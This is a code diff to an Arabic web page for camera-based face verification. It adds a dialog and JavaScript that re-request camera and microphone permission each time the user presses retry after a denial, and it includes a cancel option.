@@ -161,6 +161,14 @@
     #modalContent .err-title { color:#e53935; font-size:19px; font-weight:700; }
     #modalContent .err-msg { margin-top:8px; font-weight:600; color:#444; }
 
+    /* permission modal */
+    #permissionModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:11000; align-items:center; justify-content:center; padding:18px; box-sizing:border-box; }
+    #permissionModal.active { display:flex; }
+    #permissionBox { background:#fff; border-radius:12px; padding:20px; max-width:520px; width:100%; text-align:right; direction:rtl; box-shadow:0 8px 40px rgba(0,0,0,0.25); }
+    #permissionBox h3 { margin:0 0 8px 0; color:var(--primary-1); font-size:18px; font-weight:800; }
+    #permissionBox p { margin:0 0 12px 0; color:#333; font-weight:600; }
+    .perm-actions { display:flex; gap:10px; justify-content:flex-start; margin-top:8px; }
+
     /* تحسينات عرض الحقول على الشاشات الصغيرة */
     @media (max-width:450px){
       #app{padding:16px 1.5vw 10px 1.5vw;}
@@ -189,6 +197,24 @@
       <div class="err-title">يوجد خطأ في المعلومات</div>
       <div class="err-msg">يرجى إعادة المحاولة. سيتم توجيهك إلى البداية.</div>
       <div style="margin-top:12px;"><button id="modalCloseBtn" class="button">إغلاق</button></div>
+    </div>
+  </div>
+
+  <!-- نافذة إصرار على إذن الكاميرا -->
+  <div id="permissionModal" role="dialog" aria-hidden="true">
+    <div id="permissionBox" role="document" aria-labelledby="permTitle">
+      <h3 id="permTitle">نحتاج إذن الكاميرا</h3>
+      <p id="permText">
+        التطبيق بحاجة إلى إذن الكاميرا والميكروفون لإجراء التحقق بالوجه. إذا رفضت الطلب سيتم عرض هذه النافذة وتستطيع إعادة المحاولة.
+        الرجاء السماح بالكاميرا حتى نتمكن من المتابعة.
+      </p>
+      <p style="color:#666;font-size:13px;margin-top:6px;">
+        ملاحظة: بعض المتصفحات تحفظ خيار "رفض" بشكل دائم. إذا ظهرت رسالة أن الإذن محظور بشكل دائم، افتح إعدادات المتصفح (انقر على أيقونة القفل بجوار شريط العنوان) واسمح للكاميرا للموقع ثم اضغط "إعادة المحاولة".
+      </p>
+      <div class="perm-actions">
+        <button id="permRetryBtn" class="button">إعادة المحاولة</button>
+        <button id="permCancelBtn" class="danger-button">إلغاء</button>
+      </div>
     </div>
   </div>
 
@@ -410,6 +436,90 @@
     `;
   }
 
+  // --- إدارة إذن الكاميرا: محاولات وإعادة المحاولة عند الرفض ---
+  const permModal = document.getElementById('permissionModal');
+  const permRetryBtn = document.getElementById('permRetryBtn');
+  const permCancelBtn = document.getElementById('permCancelBtn');
+
+  function showPermissionDialog() {
+    permModal.classList.add('active');
+  }
+  function hidePermissionDialog() {
+    permModal.classList.remove('active');
+  }
+
+  // تعرض نافذة وإرجاع Promise ينتظر اختيار المستخدم (retry/cancel)
+  function promptForPermissionFromUser() {
+    return new Promise(resolve => {
+      showPermissionDialog();
+      const onRetry = () => { cleanup(); resolve('retry'); };
+      const onCancel = () => { cleanup(); resolve('cancel'); };
+      function cleanup(){
+        permRetryBtn.removeEventListener('click', onRetry);
+        permCancelBtn.removeEventListener('click', onCancel);
+        hidePermissionDialog();
+      }
+      permRetryBtn.addEventListener('click', onRetry);
+      permCancelBtn.addEventListener('click', onCancel);
+    });
+  }
+
+  // محاولة واحدة لالتقاط الستريم — تُرمى إذا فشل
+  async function tryGetUserMediaOnce() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      throw new Error('getUserMedia غير مدعوم في هذا المتصفح');
+    }
+    // نستخدم facingMode:user لالتقاط الكاميرا الأمامية إن وُجِدت
+    return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+  }
+
+  // حلقة تطالب المستخدم بإعادة المحاولة كلما تم الرفض، وتُرجع الستريم عند الموافقة أو تُرمى عند إلغاء المستخدم
+  async function requestCameraWithInsistence() {
+    // أول محاولة مباشرة (ستُظهر نافذة المتصفح إذا لم تُمنح بعد)
+    try {
+      const stream = await tryGetUserMediaOnce();
+      return stream;
+    } catch (err) {
+      // إذا كان الخطأ نتيجة رفض إذن، نطالب المستخدم بإعادة المحاولة أو التوجيه
+      const deniedNames = ['NotAllowedError','PermissionDeniedError','NotFoundError','SecurityError'];
+      const isPermissionError = err && (deniedNames.includes(err.name) || (err.message && err.message.toLowerCase().includes('permission')));
+      // بعض المتصفحات لا تعطي اسم واضح لذا نتفقد navigator.permissions إن وُجد
+      if (!isPermissionError && navigator.permissions && navigator.permissions.query) {
+        try {
+          const p = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
+          if (p && p.state === 'denied') {
+            // اعتبرها مشكلة إذن
+            // fallthrough to dialog
+          }
+        } catch(e){}
+      }
+
+      if (!isPermissionError) {
+        // إذا كان الخطأ ليس رفض إذن واضح، أعاده للمتصل ليتعامل مع الخطأ
+        throw err;
+      }
+
+      // الآن نعرض نافذة إصرار ونعيد المحاولة طالما يضغط المستخدم "إعادة المحاولة"
+      while (true) {
+        const choice = await promptForPermissionFromUser();
+        if (choice === 'cancel') throw new Error('المستخدم ألغى طلب الإذن');
+        // المستخدم اختار إعادة المحاولة -> نحاول مجدداً
+        try {
+          const stream = await tryGetUserMediaOnce();
+          return stream;
+        } catch (eAgain) {
+          // تحقق إذا كان رفض دائم (قد لا تُظهر المتصفحات prompt مرة أخرى)
+          const stillDenied = eAgain && (eAgain.name === 'NotAllowedError' || eAgain.name === 'PermissionDeniedError' || (eAgain.message && eAgain.message.toLowerCase().includes('permission')));
+          if (!stillDenied) {
+            // خطأ آخر - أرسله للخارج
+            throw eAgain;
+          }
+          // وإلا تكرار الحلقة: سيظهر نفس نافذة الإصرار ليتخذ المستخدم إجراءً آخر
+        }
+      }
+    }
+  }
+
   // تسجيل فيديو تسلسلي — الآن نسجل مرة واحدة طوال الخطوات ثم نوقف بعد النهاية
   async function startCaptureSequence(){
     renderPreparingMessage();
@@ -449,8 +559,10 @@
     const cancelBtn = document.getElementById('cancelCapture');
     let stream = null;
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+      // هنا نستخدم دالة الإصرار على طلب الإذن: ستعيد المحاولة عند الرفض طالما ال��ستخدم يضغط "إعادة المحاولة"
+      stream = await requestCameraWithInsistence();
     } catch (err) {
+      // فشل الحصول على الستريم بسبب إلغاء المستخدم أو خطأ آخر
       throw err;
     }
 
@@ -499,7 +611,7 @@
     const audioTracks = stream.getAudioTracks();
     if (audioTracks && audioTracks.length) audioTracks.forEach(t => processedStream.addTrack(t));
 
-    // اختر mime كما في السا��ق
+    // اختر mime كما في السابق
     let chosenMime = null;
     if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
       if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
